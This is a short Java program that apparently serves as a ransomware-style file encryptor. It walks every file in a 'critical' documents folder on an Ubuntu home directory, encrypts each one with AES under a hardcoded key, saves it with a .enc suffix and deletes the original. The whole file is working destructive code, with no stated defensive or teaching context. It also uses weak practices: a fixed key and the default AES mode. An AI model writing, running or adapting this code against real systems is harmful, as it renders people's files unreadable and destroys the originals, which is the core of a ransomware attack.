import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.io.*;
import java.nio.file.*;

public class cleanencryptor {

    private static final String ALGORITHM = "AES";
    private static final String FIXED_KEY = "12345678901234567890123456789012"; // 32-char = 256-bit key

    public static void main(String[] args) throws Exception {
        String targetDir = "/home/ubuntu/Documents/critical";

        SecretKeySpec secretKey = new SecretKeySpec(FIXED_KEY.getBytes(), ALGORITHM);

        Files.walk(Paths.get(targetDir))
                .filter(Files::isRegularFile)
                .forEach(file -> {
                    try {
                        System.out.println("🔐 Encrypting: " + file.getFileName());

                        byte[] fileData = Files.readAllBytes(file);
                        Cipher cipher = Cipher.getInstance(ALGORITHM);
                        cipher.init(Cipher.ENCRYPT_MODE, secretKey);
                        byte[] encryptedData = cipher.doFinal(fileData);

                        Files.write(Paths.get(file.toString() + ".enc"), encryptedData);
                        file.toFile().delete();
                    } catch (Exception e) {
                        System.out.println("❌ Failed: " + file.getFileName());
                        e.printStackTrace();
                    }
                });

        System.out.println("✅ All files encrypted with fixed key.");
    }
}
